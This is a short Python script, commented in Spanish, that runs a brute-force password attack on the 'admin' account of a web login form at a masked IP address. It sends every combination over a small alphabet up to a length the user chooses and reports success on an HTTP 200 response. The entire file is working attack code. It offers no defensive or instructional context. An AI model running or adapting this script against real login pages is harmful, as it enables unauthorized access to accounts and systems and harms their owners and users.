import itertools
import requests
import time

# URL del formulario de inicio de sesión
login_url = "http://XXX.XXX.XXX.XXXX:8080/login"

# Alfabeto de caracteres a utilizar para el ataque
alphabet = "abcdefghijklmnopqrstuvwxyz1234567890!@"

# Usuario para el ataque de fuerza bruta (podría ser un formulario de nombre de usuario)
username = "admin"


# Realiza el ataque de fuerza bruta
def brute_force_attack(max_length):
    start_time = time.time()
    total_combinations = sum(len(alphabet) ** i for i in range(1, max_length + 1))
    print(f"Total de combinaciones posibles: {total_combinations}")

    for length in range(1, max_length + 1):
        for password in itertools.product(alphabet, repeat=length):
            password = "".join(password)
            data = {"username": username, "password": password}
            print(f"Probando contraseña: {password}")
            response = requests.post(login_url, data=data)
            if response.status_code == 200:
                print(f"Contraseña encontrada: {password}")
                end_time = time.time()
                elapsed_time = end_time - start_time
                print(f"Tiempo total estimado: {elapsed_time} segundos")
                return
    print("Fuerza bruta fallida.")


if __name__ == "__main__":
    max_length = int(input("Ingrese la longitud máxima de la contraseña a probar: "))
    brute_force_attack(max_length)
